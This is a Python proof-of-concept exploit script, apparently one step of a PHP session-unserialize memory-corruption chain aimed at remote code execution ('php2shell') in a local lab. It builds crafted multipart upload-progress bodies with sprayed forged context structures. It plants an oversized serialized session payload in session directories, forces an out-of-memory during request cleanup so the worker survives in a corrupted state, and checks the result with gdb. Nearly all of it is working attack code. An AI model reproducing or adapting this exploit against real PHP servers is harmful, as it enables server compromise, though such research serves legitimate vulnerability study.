#!/usr/bin/env python3
"""amp2.py - force the END-cleanup decode (not the RINIT read) to OOM.

Two things learned the hard way:
  * ps_read_files() fstat()s fresh, so the copy must be race-proof - the arm
    writes its tree *after* the response, so wait until that file is stable.
  * an OOM during RINIT aborts the worker; an OOM during the body phase (the
    END cleanup decode) bails out normally and keeps the worker, which is the
    only way to observe BG(unserialize).level = 1 afterwards.

So the payload is sized to decode inside the limit at RINIT and past it at the
END, after the filler has been parsed.

Usage: python3 amp2.py --nested 8000 --parts 1200
"""
import argparse
import os
import re
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

URL = "http://127.0.0.1:18120/index.php"
BND = b"UctxPoc2026"
MAL = "/ndary=UctxPoc2026"
LAB = "/tmp/php2shell_ap"
SESS = LAB + "/sess"


def payload(n):
    inner = "".join("i:%d;a:2:{i:0;i:0;i:1;i:0;}" % i for i in range(n))
    return b"k|" + ("a:%d:{%s}" % (n, inner)).encode()


def body(sid, spray, ctx, n_t, n_fill, fill_size):
    out = bytearray()
    out += P.mp_part(BND, b"PHPSESSID", sid.encode())
    out += P.mp_part(BND, b"PHP_SESSION_UPLOAD_PROGRESS", b"x")
    for _ in range(spray):
        out += P.mp_part(BND, b"s[]", ctx)
    small = __import__("struct").pack("<QII", P.MARKER, 8, 0) + b"\x00" * 8
    for _ in range(n_t):
        out += P.mp_part(BND, b"t[]", small)
    for _ in range(n_fill):
        out += P.mp_part(BND, b"fill[]", b"P" * fill_size)
    out += b"--" + BND + b"--\r\n"
    return bytes(out)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--nested", type=int, default=8000)
    ap.add_argument("--parts", type=int, default=1200)
    ap.add_argument("--fill-size", type=int, default=1)
    ap.add_argument("--t", type=int, default=300)
    ap.add_argument("--spray", type=int, default=60)
    a = ap.parse_args()

    # text looks like a:8000:{...}, so the prefix guessed above is rebuilt here
    inner = "".join("i:%d;a:2:{i:0;i:0;i:1;i:0;}" % i for i in range(a.nested))
    pay = b"k|" + ("a:%d:{%s}" % (a.nested, inner)).encode()

    out = subprocess.run(["sudo", "bash", LAB + "/rce_lab.sh"], capture_output=True, text=True).stdout
    parent = int(out.split("parent=")[1].split()[0])
    child = int(out.split("child=")[1].split()[0])
    sid = "am%d-%d-abc" % (a.nested, a.parts)

    st, _d, _ = P.send(URL, P.arm_body(sid, BND, 20, 65536), BND, sid, 0, 0)

    # wait for the arm's shutdown write to land and settle
    prev = -1
    for _ in range(60):
        sz = os.path.getsize("%s/sess_%s" % (SESS, sid))
        if sz and sz == prev:
            break
        prev = sz
        time.sleep(0.1)
    tree = prev

    open("/tmp/amp2_payload", "wb").write(pay)
    for d in (MAL, SESS):
        subprocess.run(["sudo", "cp", "/tmp/amp2_payload", "%s/sess_%s" % (d, sid)], check=False)
        subprocess.run(["sudo", "chmod", "666", "%s/sess_%s" % (d, sid)], check=False)
    ondisk = [os.path.getsize("%s/sess_%s" % (d, sid)) for d in (MAL, SESS)]

    before = len(open(LAB + "/error.log", errors="replace").read())
    ctx = P.forge_ctx(P.MARKER, P.MARKER, used=1018, data0=0x4242424242424242)
    st2, d2, _ = P.send(URL, body(sid, a.spray, ctx, a.t, a.parts, a.fill_size), BND, sid, 0, 0)
    time.sleep(1.0)
    log = open(LAB + "/error.log", errors="replace").read()[before:]
    alloc = re.findall(r"tried to allocate (\d+)", log)
    alive = os.path.exists("/proc/%d" % child)
    lvl = ("-", "-")
    if alive:
        g = subprocess.run(["sudo", "gdb", "-q", "-p", str(child), "-batch", "-x", "/tmp/bgchk.gdb"],
                           capture_output=True, text=True).stdout
        for line in g.splitlines():
            if "SER_LEVEL=" in line:
                lvlprobe = line.split("SER_LEVEL=")[1].split()
                lvl = (lvlprobe[0], line.split("UNSER_LEVEL=")[1].split()[0])
    print("arm=%s tree=%d payload=%d ondisk=%s fill=%d -> %s alloc=%s alive=%s SER=%s UNSER=%s"
          % (st, tree, len(pay), ondisk, a.parts, st2, alloc[:2], alive, lvl[0], lvl[1]))


if __name__ == "__main__":
    main()
